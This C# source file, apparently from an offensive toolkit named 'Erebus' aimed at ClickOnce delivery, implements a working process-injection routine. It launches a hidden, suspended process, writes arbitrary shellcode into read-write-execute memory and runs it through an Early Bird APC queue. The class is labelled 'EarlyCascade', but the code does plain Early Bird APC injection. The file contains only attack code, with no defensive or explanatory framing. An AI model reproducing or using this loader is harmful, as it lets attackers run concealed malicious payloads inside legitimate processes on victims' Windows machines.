using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class EarlyCascadeInjection : IInjectionMethod
    {
        public string Name => "EarlyCascade";
        public string Description => "Early bird APC injection into suspended process";

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint THREAD_ALL_ACCESS = 0x1F03FF;

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                string targetProcess = InjectionConfig.TargetProcess;
                
                // Start target process in suspended state
                Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                Win32.PROCESS_INFORMATION pi;

                DebugLogger.WriteLine($"[+] Creating suspended process: {targetProcess}");
                bool success = Win32.CreateProcess(
                    null!,
                    targetProcess,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    Win32.CREATION_FLAGS.CREATE_SUSPENDED | Win32.CREATION_FLAGS.CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    null!,
                    ref si,
                    out pi);

                if (!success)
                {
                    DebugLogger.WriteLine($"[-] Failed to create process: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Process created with PID: {pi.dwProcessId}");

                // Allocate memory in target process
                IntPtr baseAddress = Win32.VirtualAllocEx(
                    (Win32.HANDLE)pi.hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                    Win32.CloseHandle(pi.hProcess);
                    Win32.CloseHandle(pi.hThread);
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode to target process
                unsafe
                {
                    fixed (byte* pShellcode = shellcode)
                    {
                        nuint written = 0;
                        Win32.BOOL writeResult = Win32.WriteProcessMemory(
                            (Win32.HANDLE)pi.hProcess,
                            (void*)baseAddress,
                            pShellcode,
                            (nuint)shellcode.Length,
                            &written);

                        if (!writeResult)
                        {
                            DebugLogger.WriteLine($"[-] WriteProcessMemory failed: {Marshal.GetLastWin32Error()}");
                            Win32.CloseHandle(pi.hProcess);
                            Win32.CloseHandle(pi.hThread);
                            return false;
                        }

                        DebugLogger.WriteLine($"[+] Written {written} bytes to target process");
                    }
                }

                // Queue APC to main thread (Early Bird)
                DebugLogger.WriteLine("[+] Queueing APC to main thread...");
                uint apcResult = QueueUserAPC(baseAddress, pi.hThread, IntPtr.Zero);
                
                if (apcResult == 0)
                {
                    DebugLogger.WriteLine($"[-] QueueUserAPC failed: {Marshal.GetLastWin32Error()}");
                    Win32.CloseHandle(pi.hProcess);
                    Win32.CloseHandle(pi.hThread);
                    return false;
                }

                // Resume thread to execute APC
                DebugLogger.WriteLine("[+] Resuming thread...");
                ResumeThread(pi.hThread);

                // Cleanup handles
                Win32.CloseHandle(pi.hThread);
                Win32.CloseHandle(pi.hProcess);

                DebugLogger.WriteLine("[+] EarlyCascade injection completed successfully");
                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] EarlyCascade injection failed: {ex.Message}");
                return false;
            }
        }
    }
}
